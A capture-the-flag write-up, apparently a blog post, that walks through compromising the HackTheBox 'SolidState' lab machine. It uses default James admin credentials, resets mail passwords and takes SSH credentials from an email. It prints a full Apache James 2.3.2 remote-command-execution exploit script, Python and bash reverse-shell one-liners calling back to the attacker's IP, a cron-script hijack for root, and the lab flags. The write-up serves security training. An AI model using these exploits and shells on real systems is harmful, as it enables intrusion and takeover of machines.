---
layout: post
title: HackTheBox SolidState
date: 2022-03-15
categories: [HackTheBox, Linux]
tags: [HackTheBox, Linux]
image: https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/image_previews/htb-solidstate.png?raw=true
---

# Machine Synopsis

SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required. ([Source](https://www.hackthebox.com/machines/solidstate))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# nmap -sC -sV -A -p- 10.10.10.51
Nmap scan report for 10.10.10.51
Host is up (0.0031s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.8 [10.10.14.8]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
119/tcp  open  nntp    JAMES nntpd (posting ok)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=5/9%Time=6278BD1D%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPle
SF:ase\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswor
SF:d:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/9%OT=22%CT=1%CU=44038%PV=Y%DS=2%DC=T%G=Y%TM=6278BE0E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   3.40 ms 10.10.14.1
2   3.42 ms 10.10.10.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 262.85 seconds
```

Lets check out their website first.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/SolidState/website.png?raw=true)

Looks like a nice website.

![website_services](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/SolidState/website_services.png?raw=true)

It seems like there’s a services webpage where you can submit a message.

However, intercepting this submit request on Burp shows nothing interesting.

Lets run a `gobuster` scan to check if we missed anything out.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# gobuster dir -u http://10.10.10.51 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
...
/images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
/index.html           (Status: 200) [Size: 7776]                                
/about.html           (Status: 200) [Size: 7183]                                
/services.html        (Status: 200) [Size: 8404]                                
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]
/server-status        (Status: 403) [Size: 299]
...
```

Hmm.. looks like there’s nothing much here. Lets move on then.

Based on the `nmap` results, there seems to be a James Mail Server listening on four different ports - `SMTP 25, POP3 110, NNTP 119 & 4555`.

Since the `nmap` results also showed that there is some login functionality on port `4555`, lets check it out first!

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nc -v 10.10.10.51 4555
10.10.10.51: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
```

It seems like we need some credentials to login. Lets Google for the default credentials using `JAMES Remote Administration Tool default credentials`.

It seems that the default credentials are `root:root`!

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nc -v 10.10.10.51 4555
10.10.10.51: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Lets list out the users!

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

It seems like there are 5 users.

Since we are the admin, we can probably change the password for all of these users! OwO

```bash
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```

# Exploitation

Now lets take a look at port `110`.

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
```

Great, it works! Lets try logging in as `james`! 

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS password
+OK Welcome james
list
+OK 0 0
.
```

It seems like there’s nothing much for `james` so lets try `thomas`!

>   You can escape the telnet terminal by using `^]`, followed by `quit`.

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER thomas
+OK
PASS password
+OK Welcome thomas
list
+OK 0 0
.
```

It seems like there’s nothing much for `thomas` as well. Lets try `john` then.

```bash
USER john
+OK
PASS password
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

`james` has an email that states something about `mindy` and restricting her access temporarily so lets check her account out.

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

Oh? There’s a SSH credential in the email for `mindy`! We should probably take note of this.

Before we move on, we should check out `mailadmin`'s account.

```bash
──(root㉿shiro)-[/home/shiro]
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mailadmin
+OK
PASS password
+OK Welcome mailadmin
list
+OK 0 0
.
```

Wow.. there was nothing for `mailadmin`. :(

Finally, lets try to ssh into the system as `mindy`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# ssh mindy@10.10.10.51                                                   
The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.51' (ED25519) to the list of known hosts.
mindy@10.10.10.51's password: P@55W0rd1!2@
...
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$ id
-rbash: id: command not found
```

As stated in the email, `mindy` has a restricted bash account. Therefore, we need to find a way to bypass this!

## Method 1 - Escape using SSH

We can ask SSH to spawn us a bash shell by using `-t "bash --noprofile"`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# ssh mindy@10.10.10.51 -t "bash --noprofile"
mindy@10.10.10.51's password: P@55W0rd1!2@
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
```

## Method 2 - Searchsploit

Lets check if there is any known exploits for James Mail Server.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# searchsploit james 2.3.2                   
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)      | linux/remote/50347.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

It looks like there are some vulnerabilities! Lets check out `Apache James Server 2.3.2 - Remote Command Execution` as that seems to be the most applicable one.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# searchsploit -m 35513   

┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# cat 35513.py  
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed." 
```

To use this payload, we can just edit the payload part to execute a Python reverse shell! OwO

```python
payload = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
```

Finally, we can execute the script!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# python 35513.py 
[-]Usage: python 35513.py <ip>
[-]Exemple: python 35513.py 127.0.0.1
                                  
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# python 35513.py 10.10.10.51
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

Great! Now, we just have to start a netcat listener and log in as an existing user.

```bash
- Trying to SSH as mindy -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# ssh mindy@10.10.10.51                      
mindy@10.10.10.51's password: P@55W0rd1!2@
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May  9 03:32:35 2022 from 10.10.14.8
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <8608933.0.1652082124685.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.8 ([10.10.14.8])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 105
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Mon, 9 May 2022 03:41:24 -0400 (EDT)
Date: Mon, 9 May 2022 03:41:24 -0400 (EDT)
From: team@team.pl

: No such file or directory

- Netcat listener -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.51] 48670
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
whoami
mindy
```

# Privilege Escalation

Lets use Linpeas to check if there’s any interesting files on the system.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.51 - - [09/May/2022 15:50:29] "GET /linpeas.sh HTTP/1.1" 200 -

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.14.8/linpeas.sh
--2022-05-09 03:50:32--  http://10.10.14.8/linpeas.sh
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776423 (758K) [text/x-sh]
Saving to: ‘linpeas.sh’
linpeas.sh                    100%[===============================================>] 758.23K  --.-KB/s    in 0.1s    
2022-05-09 03:50:32 (5.26 MB/s) - ‘linpeas.sh’ saved [776423/776423]
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ chmod +x linpeas.sh
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./linpeas.sh
...
╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Apr 26  2021 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
...
```

It looks like there is an interesting `tmp.py` file in `/opt/`.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Lets use `pspy` to check if the `tmp.py` is being executed on the system.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32

┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.51 - - [09/May/2022 15:59:53] code 404, message File not found
10.10.10.51 - - [09/May/2022 15:59:58] "GET /pspy32 HTTP/1.1" 200 -


${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.14.8/pspy32
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ chmod +x pspy32
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
...
2022/05/09 04:03:01 CMD: UID=0    PID=1716   | /bin/sh -c python /opt/tmp.py 
2022/05/09 04:03:01 CMD: UID=0    PID=1717   | python /opt/tmp.py 
2022/05/09 04:03:01 CMD: UID=0    PID=1719   | rm -r /tmp/* 
2022/05/09 04:03:01 CMD: UID=0    PID=1718   | sh -c rm -r /tmp/*  
2022/05/09 04:04:06 CMD: UID=0    PID=1720   | (anacron)  
2022/05/09 04:04:06 CMD: UID=0    PID=1721   | /lib/systemd/systemd-cgroups-agent /system.slice/anacron.service 
2022/05/09 04:04:06 CMD: UID=0    PID=1722   | 
2022/05/09 04:06:01 CMD: UID=0    PID=1723   | /usr/sbin/CRON -f 
2022/05/09 04:06:01 CMD: UID=0    PID=1725   | python /opt/tmp.py 
2022/05/09 04:06:01 CMD: UID=0    PID=1724   | /bin/sh -c python /opt/tmp.py 
2022/05/09 04:06:01 CMD: UID=0    PID=1726   | sh -c rm -r /tmp/*  
...
```

Hmm.. it looks like the `tmp.py` script is executed by root every 3 minutes!

Lets modify the script with a reverse shell code at the end of the file!

```bash
- Local machine -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# cat py_revshell  
os.system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.8/9999 <&1'")
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.51 - - [09/May/2022 16:13:51] "GET /py_revshell HTTP/1.1" 200 -

- mindy's SSH -
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ curl http://10.10.14.8/py_revshell >> tmp.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    67  100    67    0     0   5416      0 --:--:-- --:--:-- --:--:--  5583
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.8/9999 <&1'")
```

Finally, we start a netcat listener and wait for the `tmp.py` script to be executed.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/SolidState]
└─# nc -nlvp 9999                                                              
listening on [any] 9999 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.51] 40852
bash: cannot set terminal process group (1746): Inappropriate ioctl for device
bash: no job control in this shell

root@solidstate:~# whoami
root
root@solidstate:~# cat /root/root.txt
4f4afb55463c3bc79ab1e906b074953d
root@solidstate:~# cat /home/mindy/user.txt
0510e71c2e8c9cb333b36a38080d0dc2
```
